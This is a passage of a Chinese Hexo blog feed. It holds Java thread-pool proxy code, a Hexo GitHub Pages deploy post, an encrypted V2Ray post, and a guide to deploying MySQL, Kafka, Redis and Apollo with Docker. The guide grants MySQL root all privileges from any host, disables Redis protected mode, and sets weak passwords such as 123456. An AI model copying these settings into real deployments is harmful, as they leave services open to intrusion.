TimeUnit.SECONDS.sleep(<span class="hljs-number">1000000</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//代理工具类  生成代理类返回</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RejectedProxyUtil</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> RejectedExecutionHandler <span class="hljs-title function_">createProxy</span><span class="hljs-params">(RejectedExecutionHandler rejectedExecutionHandler,</span><br><span class="hljs-params">                                                       String threadPoolId,</span><br><span class="hljs-params">                                                       AtomicLong rejectCount)</span>&#123;<br>        <span class="hljs-type">RejectedExecutionHandler</span> <span class="hljs-variable">rejectProxy</span> <span class="hljs-operator">=</span> (RejectedExecutionHandler)Proxy.newProxyInstance(rejectedExecutionHandler.getClass().getClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;RejectedExecutionHandler.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">RejectedProxyInvocationHandler</span>(rejectedExecutionHandler, rejectCount, threadPoolId));<br>        <span class="hljs-keyword">return</span> rejectProxy;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//添加代理类中发送告警功能</span><br><span class="hljs-meta">@AllArgsConstructor</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RejectedProxyInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br><br>    <span class="hljs-keyword">private</span> Object target;<br><br>    <span class="hljs-keyword">private</span> AtomicLong rejectCount;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String threadPoolId;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        rejectCount.getAndIncrement();<br>        <span class="hljs-comment">// 发送警告信息 钉钉、邮箱...</span><br>        System.out.println(<span class="hljs-string">&quot;ALARM thread pool &quot;</span> + threadPoolId + <span class="hljs-string">&quot; has rejected mission&quot;</span>);<br>        <span class="hljs-comment">//alarm.sendAlarm(threadPoolId);</span><br>        <span class="hljs-keyword">return</span> method.invoke(target, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><kbd>Shift</kbd>+<kbd>F9</kbd>执行<br><img src="https://img-blog.csdnimg.cn/eda3525d0cdb4b439c6dfaeb2e35585f.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/img_convert/b9d5185ef281cf6c8c856c3513dac865.png" alt="卡比镇楼"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo部署到github pages</title>
    <link href="/2022/03/29/Hexo%E9%83%A8%E7%BD%B2github-pages/"/>
    <url>/2022/03/29/Hexo%E9%83%A8%E7%BD%B2github-pages/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><h3 id="部署到github-首先要在github创建repo-lt-username-gt-github-io-接着配置hexo部署地址"><a href="#部署到github-首先要在github创建repo-lt-username-gt-github-io-接着配置hexo部署地址" class="headerlink" title="部署到github  首先要在github创建repo ,&lt;username&gt;.github.io,接着配置hexo部署地址"></a>部署到github  首先要在github创建repo ,<code>&lt;username&gt;.github.io</code>,接着配置hexo部署地址</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ deploy:<br>   <span class="hljs-built_in">type</span>: git<br>   repo: https://github.com/YourgithubName/YourgithubName.github.io.git<br>   branch: main<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>hello</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>See The World V2Ray</title>
    <link href="/2022/03/29/VMESS+WS+TLS%20Auto/"/>
    <url>/2022/03/29/VMESS+WS+TLS%20Auto/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="49f5406fa9465865113ca6a75158904ce1ec6c753bf06cf86218b700150e104d"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">Hey, password is required here.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>v2-ray</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>部署Austin消息发布平台</title>
    <link href="/2022/03/29/INSTALL/"/>
    <url>/2022/03/29/INSTALL/</url>
    
    <content type="html"><![CDATA[<h2 id="01、安装MYSQL"><a href="#01、安装MYSQL" class="headerlink" title="01、安装MYSQL"></a>01、安装MYSQL</h2><p><strong>一</strong>、下载并安装mysql：</p><figure class="highlight awk"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs awk">wget -i -c http:<span class="hljs-regexp">//</span>dev.mysql.com<span class="hljs-regexp">/get/my</span>sql57-community-release-el7-<span class="hljs-number">10</span>.noarch.rpm<br>yum -y install mysql57-community-release-el7-<span class="hljs-number">10</span>.noarch.rpm<br>yum -y install mysql-community-server<br></code></pre></td></tr></table></figure><p><strong>二</strong>、启动并查看状态MySQL：</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-params">system</span>ctl start  mysqld.service<br><span class="hljs-params">system</span>ctl status mysqld.service<br></code></pre></td></tr></table></figure><p><strong>三</strong>、查看MySQL的默认密码：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">grep <span class="hljs-string">&quot;password&quot;</span> /<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/mysqld.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p><a href="https://tva1.sinaimg.cn/large/008i3skNgy1gwg6eiwyqfj313402mgm8.jpg"><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/98b36a9b01de4cc79f3a53245296a19c~tplv-k3u1fbpfcp-zoom-1.image" alt="img"></a></p><p><strong>四</strong>、登录进MySQL</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">mysql -uroot -<span class="hljs-selector-tag">p</span><br></code></pre></td></tr></table></figure><p><strong>五</strong>、修改默认密码（设置密码需要有大小写符号组合—安全性)，把下面的<code>my passrod</code>替换成自己的密码</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;my password&#x27;</span>;<br></code></pre></td></tr></table></figure><p><strong>六</strong>、开启远程访问 (把下面的<code>my passrod</code>替换成自己的密码)</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">grant</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">on</span> *.* <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> identified <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;my password&#x27;</span> <span class="hljs-keyword">with</span> <span class="hljs-keyword">grant</span> <span class="hljs-keyword">option</span>;<br><br>flush <span class="hljs-keyword">privileges</span>;<br><br><span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p><strong>七</strong>、在云服务上增加MySQL的端口</p><h2 id="02、安装DOCKER和DOCKER-COMPOSE"><a href="#02、安装DOCKER和DOCKER-COMPOSE" class="headerlink" title="02、安装DOCKER和DOCKER-COMPOSE"></a>02、安装DOCKER和DOCKER-COMPOSE</h2><p>首先我们需要安装GCC相关的环境：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum -y <span class="hljs-keyword">install</span> gcc<br><br>yum -y <span class="hljs-keyword">install</span> gcc-c++<br></code></pre></td></tr></table></figure><p>安装Docker需要的依赖软件包：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">yum</span> install -y yum-utils device-mapper-persistent-<span class="hljs-class"><span class="hljs-keyword">data</span> lvm2</span><br></code></pre></td></tr></table></figure><p>设置国内的镜像（提高速度）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">yum-config-manager --add-repo http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/docker-ce/</span>linux<span class="hljs-regexp">/centos/</span>docker-ce.repo<br></code></pre></td></tr></table></figure><p>更新yum软件包索引：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">yum makecache fast</span><br></code></pre></td></tr></table></figure><p>安装DOCKER CE(注意：Docker分为CE版和EE版，一般我们用CE版就够用了.)</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum -y <span class="hljs-keyword">install</span> docker-ce<br></code></pre></td></tr></table></figure><p>启动Docker：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">systemctl <span class="hljs-literal">start</span> docker<br></code></pre></td></tr></table></figure><p>下载回来的Docker版本：:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">docker <span class="hljs-built_in">version</span><br></code></pre></td></tr></table></figure><p>运行以下命令以下载 Docker Compose 的当前稳定版本：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo curl -L <span class="hljs-string">&quot;https://github.com/docker/compose/releases/download/1.24.1/docker-compose-$(uname -s)-$(uname -m)&quot;</span> -o <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>docker-compose<br></code></pre></td></tr></table></figure><p>将可执行权限应用于二进制文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo chmod +x <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>docker-compose<br></code></pre></td></tr></table></figure><p>创建软链：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo ln -s <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>docker-compose <span class="hljs-regexp">/usr/</span>bin/docker-compose<br></code></pre></td></tr></table></figure><p>测试是否安装成功：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">docker-compose <span class="hljs-comment">--version</span><br></code></pre></td></tr></table></figure><h2 id="03、安装KAFKA"><a href="#03、安装KAFKA" class="headerlink" title="03、安装KAFKA"></a>03、安装KAFKA</h2><p>新建搭建kafka环境的<code>docker-compose.yml</code>文件，内容如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3&#x27;</span><br><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">zookepper:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">wurstmeister/zookeeper</span>                    <span class="hljs-comment"># 原镜像`wurstmeister/zookeeper`</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">zookeeper</span>                        <span class="hljs-comment"># 容器名为&#x27;zookeeper&#x27;</span><br>    <span class="hljs-attr">volumes:</span>                                         <span class="hljs-comment"># 数据卷挂载路径设置,将本机目录映射到容器目录</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;/etc/localtime:/etc/localtime&quot;</span><br>    <span class="hljs-attr">ports:</span>                                           <span class="hljs-comment"># 映射端口</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;2181:2181&quot;</span><br><br>  <span class="hljs-attr">kafka:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">wurstmeister/kafka</span>                                <span class="hljs-comment"># 原镜像`wurstmeister/kafka`</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">kafka</span>                                    <span class="hljs-comment"># 容器名为&#x27;kafka&#x27;</span><br>    <span class="hljs-attr">volumes:</span>                                                 <span class="hljs-comment"># 数据卷挂载路径设置,将本机目录映射到容器目录</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;/etc/localtime:/etc/localtime&quot;</span><br>    <span class="hljs-attr">environment:</span>                                                       <span class="hljs-comment"># 设置环境变量,相当于docker run命令中的-e</span><br>      <span class="hljs-attr">KAFKA_BROKER_ID:</span> <span class="hljs-number">0</span>                                               <span class="hljs-comment"># 在kafka集群中，每个kafka都有一个BROKER_ID来区分自己</span><br>      <span class="hljs-attr">KAFKA_ADVERTISED_LISTENERS:</span> <span class="hljs-string">PLAINTEXT://ip:9092</span> <span class="hljs-comment"># TODO 将kafka的地址端口注册给zookeeper</span><br>      <span class="hljs-attr">KAFKA_LISTENERS:</span> <span class="hljs-string">PLAINTEXT://0.0.0.0:9092</span>                        <span class="hljs-comment"># 配置kafka的监听端口</span><br>      <span class="hljs-attr">KAFKA_ZOOKEEPER_CONNECT:</span> <span class="hljs-string">zookeeper:2181</span>                <br>      <span class="hljs-attr">KAFKA_CREATE_TOPICS:</span> <span class="hljs-string">&quot;hello_world&quot;</span><br>    <span class="hljs-attr">ports:</span>                              <span class="hljs-comment"># 映射端口</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;9092:9092&quot;</span><br>    <span class="hljs-attr">depends_on:</span>                         <span class="hljs-comment"># 解决容器依赖启动先后问题</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">zookepper</span><br><br>  <span class="hljs-attr">kafka-manager:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">sheepkiller/kafka-manager</span>                         <span class="hljs-comment"># 原镜像`sheepkiller/kafka-manager`</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">kafka-manager</span>                            <span class="hljs-comment"># 容器名为&#x27;kafka-manager&#x27;</span><br>    <span class="hljs-attr">environment:</span>                        <span class="hljs-comment"># 设置环境变量,相当于docker run命令中的-e</span><br>      <span class="hljs-attr">ZK_HOSTS:</span> <span class="hljs-string">zookeeper:2181</span> <br>      <span class="hljs-attr">APPLICATION_SECRET:</span> <span class="hljs-string">xxxxx</span><br>      <span class="hljs-attr">KAFKA_MANAGER_AUTH_ENABLED:</span> <span class="hljs-string">&quot;true&quot;</span>  <span class="hljs-comment"># 开启kafka-manager权限校验</span><br>      <span class="hljs-attr">KAFKA_MANAGER_USERNAME:</span> <span class="hljs-string">admin</span>       <span class="hljs-comment"># 登陆账户</span><br>      <span class="hljs-attr">KAFKA_MANAGER_PASSWORD:</span> <span class="hljs-number">123456</span>      <span class="hljs-comment"># 登陆密码</span><br>    <span class="hljs-attr">ports:</span>                              <span class="hljs-comment"># 映射端口</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;9000:9000&quot;</span><br>    <span class="hljs-attr">depends_on:</span>                         <span class="hljs-comment"># 解决容器依赖启动先后问题</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">kafka</span><br></code></pre></td></tr></table></figure><p>文件内 <strong>// TODO 中的ip</strong>需要改成自己的，并且如果你用的是云服务器，那需要把端口给打开。</p><p>在存放<code>docker-compose.yml</code>的目录下执行启动命令：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker-compose up -d</span><br></code></pre></td></tr></table></figure><p>可以查看下docker镜像运行的情况：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker ps</span> <br></code></pre></td></tr></table></figure><p>进入kafka 的容器：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">docker exec -<span class="hljs-keyword">it</span> kafka sh<br></code></pre></td></tr></table></figure><p>创建一个topic(这里我的<strong>topicName</strong>就叫austinBusiness，你们可以改成自己的)</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$KAFKA_HOME</span>/bin/kafka-topics<span class="hljs-selector-class">.sh</span> <span class="hljs-attr">--create</span> <span class="hljs-attr">--topic</span> austinBusiness <span class="hljs-attr">--partitions</span> <span class="hljs-number">1</span> <span class="hljs-attr">--zookeeper</span> zookeeper:<span class="hljs-number">2181</span> <span class="hljs-attr">--replication-factor</span> <span class="hljs-number">1</span> <br></code></pre></td></tr></table></figure><p>查看刚创建的topic信息：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$KAFKA_HOME</span>/bin/kafka-topics<span class="hljs-selector-class">.sh</span> <span class="hljs-attr">--zookeeper</span> zookeeper:<span class="hljs-number">2181</span> <span class="hljs-attr">--describe</span> <span class="hljs-attr">--topic</span> austinBusiness<br></code></pre></td></tr></table></figure><h2 id="04、安装REDIS"><a href="#04、安装REDIS" class="headerlink" title="04、安装REDIS"></a>04、安装REDIS</h2><p>首先，我们新建一个文件夹<code>redis</code>，然后在该目录下创建出<code>data</code>文件夹、<code>redis.conf</code>文件和<code>docker-compose.yaml</code>文件</p><p><code>redis.conf</code>文件的内容如下(后面的配置可在这更改，比如requirepass 我指定的密码为<code>austin</code>)</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">protected</span>-mode no<br><span class="hljs-attribute">port</span> <span class="hljs-number">6379</span><br><span class="hljs-attribute">timeout</span> <span class="hljs-number">0</span><br><span class="hljs-attribute">save</span> <span class="hljs-number">900</span> <span class="hljs-number">1</span> <br><span class="hljs-attribute">save</span> <span class="hljs-number">300</span> <span class="hljs-number">10</span><br><span class="hljs-attribute">save</span> <span class="hljs-number">60</span> <span class="hljs-number">10000</span><br><span class="hljs-attribute">rdbcompression</span> yes<br><span class="hljs-attribute">dbfilename</span> dump.rdb<br><span class="hljs-attribute">dir</span> /data<br><span class="hljs-attribute">appendonly</span> yes<br><span class="hljs-attribute">appendfsync</span> everysec<br><span class="hljs-attribute">requirepass</span> austin<br><br></code></pre></td></tr></table></figure><p><code>docker-compose.yaml</code>的文件内容如下：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">version:</span> <span class="hljs-string">&#x27;3&#x27;</span><br><span class="hljs-symbol">services:</span><br><span class="hljs-symbol">  redis:</span><br><span class="hljs-symbol">    image:</span> redis:latest<br><span class="hljs-symbol">    container_name:</span> redis<br><span class="hljs-symbol">    restart:</span> always<br><span class="hljs-symbol">    ports:</span><br>      - <span class="hljs-number">6379</span>:<span class="hljs-number">6379</span><br><span class="hljs-symbol">    volumes:</span><br>      - ./redis.conf:<span class="hljs-keyword">/usr/</span>local<span class="hljs-keyword">/etc/</span>redis/redis.conf:rw<br>      - ./data:/data:rw<br><span class="hljs-symbol">    command:</span><br>      <span class="hljs-keyword">/bin/</span>bash -c <span class="hljs-string">&quot;redis-server /usr/local/etc/redis/redis.conf &quot;</span><br></code></pre></td></tr></table></figure><p>配置的工作就完了，如果是云服务器，记得开redis端口<strong>6379</strong></p><p>启动Redis跟之前安装Kafka的时候就差不多啦</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs applescript">docker-compose up -d<br><br>docker ps<br><br>docker exec -<span class="hljs-keyword">it</span> redis redis-cli<br><br><span class="hljs-comment">-- 进入到redis后访问的密码</span><br><br>auth austin<br><br></code></pre></td></tr></table></figure><h2 id="05、安装APOLLO"><a href="#05、安装APOLLO" class="headerlink" title="05、安装APOLLO"></a>05、安装APOLLO</h2><p>部署Apollo跟之前一样直接用<code>docker-compose</code>就完事了，在GitHub已经给出了对应的教程和<code>docker-compose.yml</code>以及相关的文件，直接复制粘贴就完事咯。</p><p><strong>PS: Apollo 的docker配置文件可以参考:docker/apollo/文件夹, 简单来说,在 docker/apollo/docker-quick-start/文件夹下执行docker-compose  up -d 执行即可.</strong></p><p>目录结构最好保持一致：</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a532e3221834466a85b6739871694957~tplv-k3u1fbpfcp-watermark.image"></p><p>注：我的配置里更改过端口，所以我的程序<code>AustinApplication</code>写的端口为7000</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1b3944f3a9e849219c60e673baa5b7ff~tplv-k3u1fbpfcp-watermark.image"></p><p><strong><a href="https://www.apolloconfig.com/#/zh/deployment/quick-start-docker">https://www.apolloconfig.com/#/zh/deployment/quick-start-docker</a></strong></p><p><strong><a href="https://github.com/apolloconfig/apollo/tree/master/scripts/docker-quick-start">https://github.com/apolloconfig/apollo/tree/master/scripts/docker-quick-start</a></strong></p><p>部门的创建其实也是一份”配置”，输入<code>organizations</code>就能把现有的部门给改掉，我新增了<code>boss</code>股东部门，大家都是我的股东。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/41b096b379244288a8ab25c67b484c62~tplv-k3u1fbpfcp-zoom-1.image"></p><p>PS：我的namespace是<code>boss.austin</code></p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2101f27fee044a2d86e8d6031c808d95~tplv-k3u1fbpfcp-zoom-1.image"></p><h2 id="06、安装PROMETHEUS和GRAFANA-可选"><a href="#06、安装PROMETHEUS和GRAFANA-可选" class="headerlink" title="06、安装PROMETHEUS和GRAFANA(可选)"></a>06、安装PROMETHEUS和GRAFANA(可选)</h2><p>存放<code>docker-compose.yml</code>的信息：</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">version</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#x27;2&#x27;</span><br><br><span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span><br>    <span 